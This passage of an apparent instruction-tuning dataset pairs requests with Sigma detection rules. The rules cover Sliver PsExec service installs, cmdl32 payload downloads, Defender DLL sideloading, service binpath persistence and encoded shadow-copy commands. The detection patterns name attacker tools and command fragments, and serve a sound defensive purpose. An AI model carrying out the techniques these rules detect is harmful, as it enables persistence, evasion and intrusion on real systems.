    "instruction": "Build a Sigma rule with the goal of detecting known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands, you should: Monitor Windows System event logs for specific events and conditions that indicate potential malicious service installation activities associated with Sliver implants. Focus on events generated by the Service Control Manager, specifically those with EventID 7045, which signals a service installation. Be on the alert for services being installed from the `C:\\windows\\temp\\` directory with filenames consisting of 10 alphanumeric characters and ending with `.exe`, as this pattern is often used by attackers to execute malicious software through services. Additionally, keep an eye out for services named 'Sliver' or 'Sliver implant', as these are directly associated with the Sliver malware executing PsExec commands for remote command execution and control. These detection mechanisms are high priority due to their association with known attack methodologies and the potentially high impact of allowing Sliver implants to operate undetected within a network environment. It is also important to consider that there may be unknown cases leading to false positives, which should be investigated accordingly to refine detection accuracy.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service1:\n        ImagePath|re: '^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe'\n    selection_service2:\n        ServiceName:\n            - 'Sliver'\n            - 'Sliver implant'\n    condition: selection_id and 1 of selection_service*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service1:\n        ImagePath|re: '^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe'\n    selection_service2:\n        ServiceName:\n            - 'Sliver'\n            - 'Sliver implant'\n    condition: selection_id and 1 of selection_service*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands",
      "answer": "In order to detect known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands, you should: Monitor Windows System event logs for specific events and conditions that indicate potential malicious service installation activities associated with Sliver implants. Focus on events generated by the Service Control Manager, specifically those with EventID 7045, which signals a service installation. Be on the alert for services being installed from the `C:\\windows\\temp\\` directory with filenames consisting of 10 alphanumeric characters and ending with `.exe`, as this pattern is often used by attackers to execute malicious software through services. Additionally, keep an eye out for services named 'Sliver' or 'Sliver implant', as these are directly associated with the Sliver malware executing PsExec commands for remote command execution and control. These detection mechanisms are high priority due to their association with known attack methodologies and the potentially high impact of allowing Sliver implants to operate undetected within a network environment. It is also important to consider that there may be unknown cases leading to false positives, which should be investigated accordingly to refine detection accuracy."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\regini.exe' or the original file name matches 'REGINI.EXE'. It's important to exclude instances where the command line argument matches a certain regular expression pattern (indicating a normal operation that does not modify keys in an unauthorized manner). This detection focuses on identifying potentially malicious attempts to change registry keys through the execution of regini.exe, which might indicate an attack. Monitoring should include capturing the parent image path and command line arguments used during the process creation to help in further analysis. Be aware of legitimate modifications of keys that might trigger this detection, which are considered low-level false positives. The related MITRE ATT&CK tactics and techniques include Persistence, Privilege Escalation, and Defense Evasion through Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution, and Modify Registry respectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regini.exe'\n        - OriginalFileName: 'REGINI.EXE'\n    filter:\n        CommandLine|re: ':[^ \\\\]' # Covered in 77946e79-97f1-45a2-84b4-f37b5c0d8682\n    condition: selection and not filter\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate modification of keys\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\regini.exe'\n        - OriginalFileName: 'REGINI.EXE'\n    filter:\n        CommandLine|re: ':[^ \\\\]' # Covered in 77946e79-97f1-45a2-84b4-f37b5c0d8682\n    condition: selection and not filter\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate modification of keys\nlevel: low\n",
      "question": "execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files.",
      "answer": "In order to detect the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\regini.exe' or the original file name matches 'REGINI.EXE'. It's important to exclude instances where the command line argument matches a certain regular expression pattern (indicating a normal operation that does not modify keys in an unauthorized manner). This detection focuses on identifying potentially malicious attempts to change registry keys through the execution of regini.exe, which might indicate an attack. Monitoring should include capturing the parent image path and command line arguments used during the process creation to help in further analysis. Be aware of legitimate modifications of keys that might trigger this detection, which are considered low-level false positives. The related MITRE ATT&CK tactics and techniques include Persistence, Privilege Escalation, and Defense Evasion through Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution, and Modify Registry respectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting lolbas Cmdl32 is use to download a payload to evade antivirus.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to lolbas Cmdl32 is used to download a payload to evade antivirus, you should: Monitor the creation of processes on Windows operating systems, focusing on cases where the process image name ends with '\\cmdl32.exe' or the original file name is identified exactly as CMDL32.EXE. Additionally, watch for command-line parameters that contain both '/vpn ' and '/lan ', as these are characteristic of the technique being employed to download malicious payloads while attempting to bypass antivirus detection. Recognize that sightings of these indicators may not always be malicious in nature (thus considered as potential false positives) but warrant a medium level of attention due to their association with evasive tactics.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn '\n            - '/lan '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn '\n            - '/lan '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "lolbas Cmdl32 is use to download a payload to evade antivirus",
      "answer": "In order to lolbas Cmdl32 is used to download a payload to evade antivirus, you should: Monitor the creation of processes on Windows operating systems, focusing on cases where the process image name ends with '\\cmdl32.exe' or the original file name is identified exactly as CMDL32.EXE. Additionally, watch for command-line parameters that contain both '/vpn ' and '/lan ', as these are characteristic of the technique being employed to download malicious payloads while attempting to bypass antivirus detection. Recognize that sightings of these indicators may not always be malicious in nature (thus considered as potential false positives) but warrant a medium level of attention due to their association with evasive tactics."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting change of user type from \"Guest\" to \"Member\" for potential elevation of privilege..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the change of user type from \"Guest\" to \"Member\" for potential elevation of privilege, you should focus on monitoring Azure audit logs. Specifically, look for logs under the UserManagement category where the operation name is \"Update user\". The key indicator of this activity is when the properties.message field includes a change in the user's display name from \"Guest\" to \"Member\", as shown by the oldValue being \"[\\\"Guest\\\"]\" and newValue being \"[\\\"Member\\\"]\". It's essential to consider certain actions as acceptable, such as changes approved by the System Administrator; these are typically identified as false positives and should be handled accordingly. The severity level of this activity is considered medium, suggesting that while it's important, it may not immediately indicate a direct threat but should prompt further investigation. This monitoring approach is aligned with understanding tactics and techniques related to potential elevation of privilege attempts, ensuring that your defense mechanisms are adept at identifying such security events.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: 'UserManagement'\n        OperationName: 'Update user'\n        properties.message: '\"displayName\":\"UserType\",\"oldValue\":\"[\\\"Guest\\\"]\",\"newValue\":\"[\\\"Member\\\"]\"'\n    condition: selection\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: 'UserManagement'\n        OperationName: 'Update user'\n        properties.message: '\"displayName\":\"UserType\",\"oldValue\":\"[\\\"Guest\\\"]\",\"newValue\":\"[\\\"Member\\\"]\"'\n    condition: selection\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
      "question": "change of user type from \"Guest\" to \"Member\" for potential elevation of privilege.",
      "answer": "In order to detect the change of user type from \"Guest\" to \"Member\" for potential elevation of privilege, you should focus on monitoring Azure audit logs. Specifically, look for logs under the UserManagement category where the operation name is \"Update user\". The key indicator of this activity is when the properties.message field includes a change in the user's display name from \"Guest\" to \"Member\", as shown by the oldValue being \"[\\\"Guest\\\"]\" and newValue being \"[\\\"Member\\\"]\". It's essential to consider certain actions as acceptable, such as changes approved by the System Administrator; these are typically identified as false positives and should be handled accordingly. The severity level of this activity is considered medium, suggesting that while it's important, it may not immediately indicate a direct threat but should prompt further investigation. This monitoring approach is aligned with understanding tactics and techniques related to potential elevation of privilege attempts, ensuring that your defense mechanisms are adept at identifying such security events."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of PSAttack PowerShell hack tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of PSAttack PowerShell hack tool, you should: Focus on monitoring PowerShell scripts within the Windows environment, specifically looking into the Script Block Logging feature. This is predicated on having Script Block Logging enabled to properly log script activity. Your detection mechanism should key in on identifying scripts that contain the specific text 'PS ATTACK!!!'. This method of detection is categorized under PowerShell script monitoring (ps_script) and is crucial for identifying instances where the PSAttack tool might be employed. Mark any detections with a high level of concern due to the potential severity of such tool usage in your environment. The absence of known false positives highlights the specificity of this detection criterion, although it remains important to consider the context within which the script was found to ensure accurate interpretation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'PS ATTACK!!!'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'PS ATTACK!!!'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of PSAttack PowerShell hack tool",
      "answer": "In order to detect the use of PSAttack PowerShell hack tool, you should: Focus on monitoring PowerShell scripts within the Windows environment, specifically looking into the Script Block Logging feature. This is predicated on having Script Block Logging enabled to properly log script activity. Your detection mechanism should key in on identifying scripts that contain the specific text 'PS ATTACK!!!'. This method of detection is categorized under PowerShell script monitoring (ps_script) and is crucial for identifying instances where the PSAttack tool might be employed. Mark any detections with a high level of concern due to the potential severity of such tool usage in your environment. The absence of known false positives highlights the specificity of this detection criterion, although it remains important to consider the context within which the script was found to ensure accurate interpretation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor Windows image load events for instances where the Microsoft Defender processes, specifically 'MpCmdRun.exe' or 'NisSrv.exe', attempt to load the 'mpclient.dll' dynamic link library. The focus should be on identifying when these DLLs are loaded from locations outside the standard directories typically used by Windows Defender, such as 'C:\\Program Files\\Windows Defender\\', 'C:\\Program Files (x86)\\Windows Defender\\', or 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'. The appearance of such activity indicates a high probability of an attempt at DLL sideloading - a technique often used by adversaries to execute malicious code by exploiting the legitimate processes of trusted applications. It's crucial to note that false positives for this detection method are very unlikely, underscoring the importance of this monitoring in identifying potential security breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith:\n            - '\\MpCmdRun.exe'\n            - '\\NisSrv.exe'\n        ImageLoaded|endswith: '\\mpclient.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files\\Windows Defender\\'\n            - 'C:\\Program Files (x86)\\Windows Defender\\'\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n    condition: selection and not filter\nfalsepositives:\n    - Very unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith:\n            - '\\MpCmdRun.exe'\n            - '\\NisSrv.exe'\n        ImageLoaded|endswith: '\\mpclient.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files\\Windows Defender\\'\n            - 'C:\\Program Files (x86)\\Windows Defender\\'\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n    condition: selection and not filter\nfalsepositives:\n    - Very unlikely\nlevel: high\n",
      "question": "loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "answer": "In order to detect loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor Windows image load events for instances where the Microsoft Defender processes, specifically 'MpCmdRun.exe' or 'NisSrv.exe', attempt to load the 'mpclient.dll' dynamic link library. The focus should be on identifying when these DLLs are loaded from locations outside the standard directories typically used by Windows Defender, such as 'C:\\Program Files\\Windows Defender\\', 'C:\\Program Files (x86)\\Windows Defender\\', or 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'. The appearance of such activity indicates a high probability of an attempt at DLL sideloading - a technique often used by adversaries to execute malicious code by exploiting the legitimate processes of trusted applications. It's crucial to note that false positives for this detection method are very unlikely, underscoring the importance of this monitoring in identifying potential security breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file and folder permission changes..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains:\n            - 'chmod'\n            - 'chown'\n    condition: selection\nfalsepositives:\n    - User interacting with files permissions (normal/daily behaviour).\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains:\n            - 'chmod'\n            - 'chown'\n    condition: selection\nfalsepositives:\n    - User interacting with files permissions (normal/daily behaviour).\nlevel: low\n",
      "question": "file and folder permission changes.",
      "answer": "In order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.\nScreen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who attempt to take screen captures of the desktop to gather information over the course of an operation, where screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations, you should focus on monitoring PowerShell script activity within the Windows environment. Specifically, ensure that Script Block Logging is enabled, as it plays a crucial role in identifying potentially malicious activities. Look for PowerShell scripts that include the method '.CopyFromScreen' in their text. This method is a tell-tale sign that a script is attempting to capture the screen, which is often associated with adversarial behavior aiming to collect sensitive information post system compromise. Be aware that there are scenarios where this detection might flag benign activities, although such cases are currently unknown, indicating the rule's relevance and specificity towards malicious conduct. This detection strategy is especially critical, given its medium-level prioritization, in the broader context of defending against information gathering tactics and techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: '.CopyFromScreen'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: '.CopyFromScreen'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.\nScreen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations\n",
      "answer": "In order to detect adversaries who attempt to take screen captures of the desktop to gather information over the course of an operation, where screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations, you should focus on monitoring PowerShell script activity within the Windows environment. Specifically, ensure that Script Block Logging is enabled, as it plays a crucial role in identifying potentially malicious activities. Look for PowerShell scripts that include the method '.CopyFromScreen' in their text. This method is a tell-tale sign that a script is attempting to capture the screen, which is often associated with adversarial behavior aiming to collect sensitive information post system compromise. Be aware that there are scenarios where this detection might flag benign activities, although such cases are currently unknown, indicating the rule's relevance and specificity towards malicious conduct. This detection strategy is especially critical, given its medium-level prioritization, in the broader context of defending against information gathering tactics and techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting base64 encoded listing Win32_Shadowcopy.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect base64 encoded listing Win32_Shadowcopy, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for command lines that contain base64 encoded strings indicative of operations associated with Win32_Shadowcopy, potentially wrapped within a ForEach-Object PowerShell cmdlet. These strings are highly unique and their presence in the command line is a strong indicator of an attempt to interact with or exploit Windows Shadow Copy capabilities, possibly for malicious purposes like data theft, ransomware preparation, or evasion. Given the encoded nature of the command lines being searched for and the specificity of the operation, this type of activity is considered highly suspicious and false positives are unlikely. Monitoring for these encoded command lines is crucial for early detection of such malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Win32_Shadowcopy | ForEach-Object\n        CommandLine|contains:\n            - 'VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA'\n            - 'cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A'\n            - 'XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Win32_Shadowcopy | ForEach-Object\n        CommandLine|contains:\n            - 'VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA'\n            - 'cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A'\n            - 'XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "base64 encoded listing Win32_Shadowcopy",
      "answer": "In order to detect base64 encoded listing Win32_Shadowcopy, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for command lines that contain base64 encoded strings indicative of operations associated with Win32_Shadowcopy, potentially wrapped within a ForEach-Object PowerShell cmdlet. These strings are highly unique and their presence in the command line is a strong indicator of an attempt to interact with or exploit Windows Shadow Copy capabilities, possibly for malicious purposes like data theft, ransomware preparation, or evasion. Given the encoded nature of the command lines being searched for and the specificity of the operation, this type of activity is considered highly suspicious and false positives are unlikely. Monitoring for these encoded command lines is crucial for early detection of such malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect attempt to enable auditing of TTY input.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_path_events:\n        type: PATH\n        name:\n            - '/etc/pam.d/system-auth'\n            - '/etc/pam.d/password-auth'\n    selection_tty_events:\n        type:\n            - 'TTY'\n            - 'USER_TTY'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative work\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_path_events:\n        type: PATH\n        name:\n            - '/etc/pam.d/system-auth'\n            - '/etc/pam.d/password-auth'\n    selection_tty_events:\n        type:\n            - 'TTY'\n            - 'USER_TTY'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative work\nlevel: high\n",
      "question": "Detect attempt to enable auditing of TTY input",
      "answer": "In order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence, you should: Monitor Windows process creation logs for specific command-line patterns that indicate such modifications. Look for usage of the 'sc' command in combination with 'config' and 'binpath=', or 'failure' and 'command=' which can be used to change service configurations or set up custom failure actions - a common technique for establishing persistence by ensuring a payload executes under certain conditions. Additionally, watch for the 'reg add' command modifying 'FailureCommand' or 'ImagePath' registry keys, as this also signifies attempts to alter service behavior or execution paths. Also, be vigilant for commands that involve file extensions typically associated with executable and script files, such as '.exe', '.dll', '.bat', '.cmd', '.ps', and others, as these often indicate the introduction or modification of files to carry malicious payloads. This detection focuses on medium-level threats and, while there might be legitimate uses, any matches should be investigated to confirm whether they are part of a potential attack involving persistence mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'config '\n            - 'binpath='\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'failure'\n            - 'command='\n    selection_reg_img:\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'FailureCommand'\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'ImagePath'\n    selection_reg_ext:\n        CommandLine|contains:\n            - '.sh'\n            - '.exe'\n            - '.dll'\n            - '.bin$'\n            - '.bat'\n            - '.cmd'\n            - '.js'\n            - '.msh$'\n            - '.reg$'\n            - '.scr'\n            - '.ps'\n            - '.vb'\n            - '.jar'\n            - '.pl'\n    condition: selection_sc or all of selection_reg_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'config '\n            - 'binpath='\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'failure'\n            - 'command='\n    selection_reg_img:\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'FailureCommand'\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'ImagePath'\n    selection_reg_ext:\n        CommandLine|contains:\n            - '.sh'\n            - '.exe'\n            - '.dll'\n            - '.bin$'\n            - '.bat'\n            - '.cmd'\n            - '.js'\n            - '.msh$'\n            - '.reg$'\n            - '.scr'\n            - '.ps'\n            - '.vb'\n            - '.jar'\n            - '.pl'\n    condition: selection_sc or all of selection_reg_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence.",
      "answer": "In order to detect the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence, you should: Monitor Windows process creation logs for specific command-line patterns that indicate such modifications. Look for usage of the 'sc' command in combination with 'config' and 'binpath=', or 'failure' and 'command=' which can be used to change service configurations or set up custom failure actions - a common technique for establishing persistence by ensuring a payload executes under certain conditions. Additionally, watch for the 'reg add' command modifying 'FailureCommand' or 'ImagePath' registry keys, as this also signifies attempts to alter service behavior or execution paths. Also, be vigilant for commands that involve file extensions typically associated with executable and script files, such as '.exe', '.dll', '.bat', '.cmd', '.ps', and others, as these often indicate the introduction or modification of files to carry malicious payloads. This detection focuses on medium-level threats and, while there might be legitimate uses, any matches should be investigated to confirm whether they are part of a potential attack involving persistence mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks, you should: Monitor Windows process creation logs for instances where the process description is \"VNCViewer\", the product is identified as \"UltraVNC VNCViewer\", the company associated with the process is \"UltraVNC\", and the original file name is \"VNCViewer.exe\". This detection is focused on identifying the use of VNCViewer, a component of UltraVNC, which is a legitimate remote desktop software that could be misused by attackers to control systems remotely. While this activity may represent legitimate use of UltraVNC for desktop support, instances detected under unusual circumstances or from unexpected sources should be investigated, considering the medium level of threat it represents, to distinguish between proper administrative use and potential malicious activity aiming at command and control.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: VNCViewer\n        - Product: UltraVNC VNCViewer\n        - Company: UltraVNC\n        - OriginalFileName: VNCViewer.exe\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
